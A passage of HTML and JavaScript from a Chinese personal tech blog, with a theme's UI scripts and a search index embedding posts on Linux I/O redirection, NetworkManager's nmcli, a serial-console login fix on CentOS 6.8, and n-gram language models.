        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, transitionDir, {});
          }
        })
        window.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'true'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // 代码高亮
  hljs.initHighlightingOnLoad();
  
  // 离开当前页title变化
  var leaveTitle = "";
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>
    <div class="light-box" id="light_box"></div>
<script>
  let imgs = document.querySelectorAll('.post-body img');
  let lightBox = document.querySelector('#light_box');
  lightBox.addEventListener('mousedown', (e) => {
    e.preventDefault()
  })
  lightBox.addEventListener('mousewheel', (e) => {
    e.preventDefault()
  })
  let width = window.innerWidth * 0.8;
  lightBox.onclick = () => {
    let img = lightBox.querySelector('img');
    lightBox.style = '';
    img && img.remove();
  }
  imgs.forEach(item => {
    item.onclick = function (e) {
      let lightImg = document.createElement('img');
      lightImg.src = this.src;
      lightBox.style = `height: 100%; opacity: 1; background-color: rgba(0, 0, 0, 0.5);cursor: zoom-out;`;
      lightImg.style = `width: ${width}px;border-radius: 2px;`;
      lightImg.onclick = function () {
        lightBox.style = '';
        this.remove();
      }
      lightBox.append(lightImg);
    }
  })
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        window.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        window.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        window.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        window.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      window.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      window.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-biao-zhun-shu-ru-shu-chu-cuo-wu-ji-chong-ding-xiang/"" data-c="
          &lt;h3 id=&#34;标准输入输出错误&#34;&gt;标准输入/输出/错误&lt;/h3&gt;
&lt;p&gt;linux下每个进程在运行的过程中都会打开一系列的文件，可以通过&lt;code&gt;lsof -p $pid&lt;/code&gt;来查看进程号为pid打开的文件，在&lt;code&gt;/proc/pid/fd/&lt;/code&gt;下是该进程打开的文件的链接。其中有三个比较特殊的文件是每个进程都会打开，其文件描述符分为0，1，2，默认分别链接到标准输入(STDIN_FILENO)设备(/dev/stdin)、标准输出(STDOUT_FILENO)设备(/dev/stdout)、标准错误(STDERR_FILENO)(/dev/stderr)设备。&lt;/p&gt;
&lt;p&gt;进程在运行的过程中默认情况下产生的输出会写到stdout文件，产生的错误信息写到stderr文件，默认这两个文件会链接到屏幕设备，许多进程从标准输入stdin获取输入，默认链接为键盘设备。如果更改这几个文件的链接位置，就可以实现对其他文件的输入输出。&lt;/p&gt;
&lt;h3 id=&#34;更换标准输入输出错误&#34;&gt;更换标准输入/输出/错误&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;: 输出重定向到一个文件或设备，覆盖原来的内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;: 输出重定向到一个文件或设备，追加到末尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;: 输入重定向一个程序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;输出&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echo hello &amp;gt; out.log
# echo hello 1&amp;gt; out.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这两个命令的作用是相同的，都是讲echo进程的输出重定向到out.log文件，在这里&amp;gt;左边的1可以省略。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;错误&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echo hello 2&amp;gt; err.log
hello
# echoo hello 2&amp;gt; err.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2&amp;gt;表示将进程的错误信息重定向到err.log文件，第一行的命令没有错误信息，因此会输出hello到标准输出，即会显示到屏幕上，第二行输出了一个不存在的指令，这时的错误输出信息会输入到err.log中。&lt;/p&gt;
&lt;p&gt;如果需要把输出信息和错误信息都重定向到某个文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echoo hello 1&amp;gt; err.log 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的1&amp;gt;和前面的用法相同，2&amp;gt;&amp;amp;1是将错误信息&lt;strong&gt;追加&lt;/strong&gt;到标准输出中。&amp;gt;&amp;amp;是一个整体，不可分开。&lt;/p&gt;
&lt;p&gt;一些例子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 错误信息重定向到标准输出，输出重定向到out.log
# cat file 2&amp;gt;&amp;amp;1 &amp;gt;out.log
# 将输出重定向到out.log，错误定向到输出
# cat file &amp;gt;out.log 2&amp;gt;&amp;amp;1
# 将错误和输出重定向更简单的写法
# cat file &amp;amp;&amp;gt; out.log
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;输入&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;将一个命令的输入重定向为其他文件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# cat &amp;lt; file.in
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外还有一种&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;的方式，称为here文档，它会从标准输入中持续读入字符，直到匹配到指定的token读取结束。例如&lt;code&gt;cat&lt;/code&gt;命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;lt;&amp;lt; EOF &amp;gt; out.log
&amp;gt; hello
&amp;gt; world
&amp;gt; EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种方式是将cat 命令的输出重定向到out.log中，其内容是从第二行开始到EOF之前结束，EOF是结束token，可以人为指定为其他字符，例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;lt;&amp;lt; ENDOFFILE &amp;gt; out.log
&amp;gt; 1
&amp;gt; 2
&amp;gt; 3
&amp;gt; ENDOFFILE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种写法是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;gt; out.log &amp;lt;&amp;lt; EOF
&amp;gt; 1
&amp;gt; 2
&amp;gt; 3
&amp;gt; ENDOFFILE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果和上面的一致。&lt;/p&gt;
">linux标准输入/输出/错误及重定向</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/networkmanager-wang-luo-guan-li/"" data-c="
          &lt;p&gt;linux将物理网络设备抽象为interface，屏蔽了物理网络设备的多样性，通过驱动程序检测固件信息在linux内核中登记，在数据包收发时通过interface进行交互。网络管理工具包括network服务，NetworkManager服务，ipconfig服务、netstat服务等。在REHL8/centos8中弃用了之前版本中网络管理的network服务，使用NetworkManager服务替代。&lt;/p&gt;
&lt;p&gt;NetworkManager主要管理两类对象：connection(网卡连接配置)和device(网卡设备)，device对应的是interface，而connection是供设备使用的配置，二者是多对一的关系，但同时只有一个connection对象生效，其中配置文件依然默认存放在&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;下，配置方式有两种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过&lt;code&gt;nmcli connection add&lt;/code&gt;命令配置，会自动生成配置文件；&lt;/li&gt;
&lt;li&gt;手动配置ifcfg文件，通过&lt;code&gt;nmcli connection reload&lt;/code&gt;来使其生效；&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;1-nmcli命令参数&#34;&gt;1 nmcli命令参数&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli --help
Usage: nmcli [OPTIONS] OBJECT { COMMAND | help }                              
OPTIONS
  -a, --ask                                ask for missing parameters         
  -c, --colors auto|yes|no                 whether to use colors in output    
  -e, --escape yes|no                      escape columns separators in values         
  -f, --fields &amp;lt;field,...&amp;gt;|all|common      specify fields to output           
  -g, --get-values &amp;lt;field,...&amp;gt;|all|common  shortcut for -m tabular -t -f      
  -h, --help                               print this help                    
  -m, --mode tabular|multiline             output mode                        
  -o, --overview                           overview mode                      
  -p, --pretty                             pretty output                      
  -s, --show-secrets                       allow displaying passwords         
  -t, --terse                              terse output                       
  -v, --version                            show program version               
  -w, --wait &amp;lt;seconds&amp;gt;                     set timeout waiting for finishing operations
                                                            
OBJECT 
  g[eneral]       NetworkManagers general status and operations              
  n[etworking]    overall networking control                                  
  r[adio]         NetworkManager radio switches                               
  c[onnection]    NetworkManagers connections                                
  d[evice]        devices managed by NetworkManager
  a[gent]         NetworkManager secret agent or polkit agent
  m[onitor]       monitor NetworkManager changes
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-创建connection&#34;&gt;2 创建connection&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;查看当前网络状态&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection show
NAME         UUID                                  TYPE      DEVICE 
eth0  5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出每一行对应一个connection条目。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;删除当前的connection&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection delete eth0
Connection &#39;eth0&#39; (5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03) successfully deleted.
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;新建一个connection，使其生效&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection add ifname eth0 con-name eth1 type ethernet
Connection &#39;eth1&#39; (7871698e-1a4e-41d0-80c5-24374ced9526) successfully added.
# nmcli connection show
NAME         UUID                                  TYPE      DEVICE 
eth1         e09fedfe-fe0a-4a30-b304-8bc662427e65  ethernet  --
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时在&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;下自动生成了一个ifcfg-eth1的配置文件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection up eth1
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnec
tion/7)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-修改connection&#34;&gt;3 修改connection&lt;/h2&gt;
&lt;p&gt;修改一个已经存在connection，直接编辑&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;下对应的配置文件，修改完后：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection reload
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者直接通过&lt;code&gt;nmcli connection modify&lt;/code&gt;命令进行修改。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection modify help
Usage: nmcli connection modify { ARGUMENTS | help }

ARGUMENTS := [id | uuid | path] &amp;lt;ID&amp;gt; ([+|-]&amp;lt;setting&amp;gt;.&amp;lt;property&amp;gt; &amp;lt;value&amp;gt;)+

Modify one or more properties of the connection profile.
The profile is identified by its name, UUID or D-Bus path. For multi-valued
properties you can use optional &#39;+&#39; or &#39;-&#39; prefix to the property name.
The &#39;+&#39; sign allows appending items instead of overwriting the whole value.
The &#39;-&#39; sign allows removing selected items instead of the whole value.

ARGUMENTS := remove &amp;lt;setting&amp;gt;

Remove a setting from the connection profile.

Examples:
nmcli con mod home-wifi wifi.ssid rakosnicek
nmcli con mod em1-1 ipv4.method manual ipv4.addr &amp;quot;192.168.1.2/24, 10.10.1.5/8&amp;quot;
nmcli con mod em1-1 +ipv4.dns 8.8.4.4
nmcli con mod em1-1 -ipv4.dns 1
nmcli con mod em1-1 -ipv6.addr &amp;quot;abbe::cafe/56&amp;quot;
nmcli con mod bond0 +bond.options mii=500
nmcli con mod bond0 -bond.options downdelay
nmcli con mod em1-1 remove sriov
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-修改device名称&#34;&gt;4 修改device名称&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ip link set dev eth0 down
# ip link set dev eth0 name eth01
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后将&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;下的配置文件中的&lt;code&gt;device&lt;/code&gt;字段也进行更新。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ip link set dev eth01 up 
# nmcli connection reload
&lt;/code&gt;&lt;/pre&gt;
">NetworkManager 管理网卡设备</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/guan-yu-chuan-kou-console-deng-lu-shu-ru-shu-chu-shu-ju-za-rou-wen-ti-jie-jue/"" data-c="
          &lt;p&gt;这两天在制作云镜像时，之前的centos6.8旧版本镜像存在一个问题，基于virsh console命令登录虚机，会出现输入输出数据杂糅的问题，导致无法登录。&lt;/p&gt;
&lt;h2 id=&#34;1-问题复现&#34;&gt;1 问题复现&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# virsh console 1
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1683688865606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;输入的用户名密码要么输不全，要么会混到下次的输入行中。&lt;/p&gt;
&lt;h2 id=&#34;2-问题分析&#34;&gt;2 问题分析&lt;/h2&gt;
&lt;p&gt;要想解决此问题，首先要了解一下可以连接linux的设备的类型。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;串口终端&lt;/strong&gt;：与计算机的串行端口相连接的终端设备，通常将串口相连接的设备都是字符设备，串口最大的用途是连接终端，一次常被称为串口终端，这些设备对应的文件位置在&lt;code&gt;/dev/ttySn&lt;/code&gt;，设备号通常为&lt;code&gt;ttyS0&lt;/code&gt;、&lt;code&gt;ttyS1&lt;/code&gt;等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;伪终端&lt;/strong&gt;：伪终端是成对的逻辑终端，一个master终端和一个salve终端，其中slave对应&lt;code&gt;/dev/pts/&lt;/code&gt;下的一个文件，而master则在内存中标识为一个文件描述符。伪终端由终端模拟器提供，终端模拟器是运行在用户态的一个应用程序。&lt;code&gt;/dev/ptmx&lt;/code&gt;是用于创建master和slave的文件，当一个进程打开它时，获得了一个master的文件描述符，同时在&lt;code&gt;/dev/pts&lt;/code&gt;下创建一个slave设备文件。master端是更接近用户显示器、键盘的一端，slave端是在虚拟终端上运行的CLI（Command Line Interface，命令行接口）程序。Linux的伪终端驱动程序，会把“master端（如键盘）写入的数据”转发给slave端供程序输入，把“程序写入slave端的数据”转发给master端供（显示器驱动等）读取。&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1683702714124.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ssh和telnet则是使用伪终端实现的，虚拟终端的个数不受限制。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚拟终端&lt;/strong&gt;：控制台终端通常指与计算直接相连的终端，可以理解为物理终端，例如vmware打开虚机的操作终端界面，按&lt;code&gt;alt+[F1~F6]&lt;/code&gt;更换控制台终端，默认情况下可以切换tty1~tty6。&lt;code&gt;/dev/console&lt;/code&gt;对应了当前的焦点终端，例如当前使用的是tty3，那么&lt;code&gt;/dev/console/&lt;/code&gt;则指&lt;code&gt;/dev/tty3&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除此之外，还有&lt;strong&gt;控制终端tty&lt;/strong&gt;，控制终端通常是对于前台进程而言的一个概念，每一个前台进程有对应的控制终端，那么&lt;code&gt;/dev/tty&lt;/code&gt;就是该进程的设备文件，可以通过&lt;code&gt;ps -ax&lt;/code&gt;查看进程与哪个控制终端相连。对于当前登录的shell进程而言，&lt;code&gt;/dev/tty&lt;/code&gt;就是shell进程使用的终端，或者直接使用&lt;code&gt;tty&lt;/code&gt;命令查看其具体属于的终端设备。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;virsh console&lt;/code&gt;命令是属于串口终端一类，串口终端进程在启动之前会检查grub引导参数，并对相关的配置文件进行读取。&lt;/p&gt;
&lt;p&gt;在centos6.8的镜像的&lt;code&gt;/etc/grub.conf&lt;/code&gt;的kernel行配置的最后为&lt;code&gt;console=tty0 console=ttyS0,115200n8&lt;/code&gt;，其含义是将kernel的启动log输入到tty0和ttyS0，且配置靠后者的优先级更高，即ttyS0作为主要console。&lt;/p&gt;
&lt;p&gt;而在&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;有一段说明：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# How this works:
#
# On boot, a udev helper examines /dev/console. If a serial console is the
# primary console (last console on the commandline in grub),  the event
# &#39;fedora.serial-console-available &amp;lt;port name&amp;gt; &amp;lt;speed&amp;gt;&#39; is emitted, which
# triggers this script. It waits for the runlevel to finish, ensures
# the proper port is in /etc/securetty, and starts the getty.
#
# If your serial console is not the primary console, or you want a getty
# on serial even if it&#39;s not the console, create your own event e.g.
# /etc/init/ttyS0.conf with content:
# # ttyS0 - agetty
# #
# # This service maintains a agetty on ttyS0.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;意思是串口终端如果优先级较高的console配置在grub的commandline中，则会执行此脚本。此脚本中的命令为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start on fedora.serial-console-available DEV=* and stopped rc RUNLEVEL=[2345]
stop on runlevel [S016]

instance $DEV
respawn
pre-start exec /sbin/securetty $DEV
exec /sbin/agetty /dev/$DEV $SPEED vt100-nav
post-stop exec /sbin/initctl emit --no-wait fedora.serial-console-available DEV=$DEV SPEED=$SPEED
usage &#39;DEV=ttySX SPEED=Y  - where X is console id and Y is baud rate&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而在该镜像中的&lt;code&gt;/etc/init/&lt;/code&gt;下还存在一个&lt;code&gt;ttyS0.conf&lt;/code&gt;脚本文件，该脚本文件是在运行串口终端程序之前执行，其命令为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start on stopped rc RUNLEVEL=[2345]
stop on starting runlevel [016]
respawn
instance /dev/ttyS0
exec /sbin/agetty /dev/ttyS0 115200 vt100-nav
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我猜是这两个脚本执行重复了，然后我采用了如下的解决方法进行验证。&lt;/p&gt;
&lt;h2 id=&#34;3-问题解决&#34;&gt;3 问题解决&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;删除&lt;code&gt;/etc/grub.conf&lt;/code&gt;commandline行的&lt;code&gt;console=ttyS0,115200n8&lt;/code&gt;，或者将其置于&lt;code&gt;console=tty&lt;/code&gt;之前，这样&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;不会得到执行；&lt;/li&gt;
&lt;li&gt;删除&lt;code&gt;/etc/init/ttyS0.conf&lt;/code&gt;文件，只执行&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这两种方法均可以解决此问题，后来为了证明不是其他地方出现的问题，又在centos官网下载了6.8版本的镜像进行对比测试，测试结果无差异。&lt;/p&gt;
">关于串口console登录输入输出数据杂糅问题解决</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/n-gram/"" data-c="
          &lt;h2 id=&#34;n-gram&#34;&gt;n-gram&lt;/h2&gt;
&lt;h3 id=&#34;基本原理&#34;&gt;基本原理&lt;/h3&gt;
&lt;p&gt;N-gram是一种简单的语言模型，在一些NLP任务中，我们需要判断一句话出现的概率是多少，即这句话是不是符合人的说话习惯，这时就可以利用到N-gram。例如在搜索引擎中输入一个词语，下面会出现多个扩展词条，这种功能其实就可以通过N-gram实现。&lt;/p&gt;
&lt;p&gt;N-gram的数据模型很简单，就一条数学表达式：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi 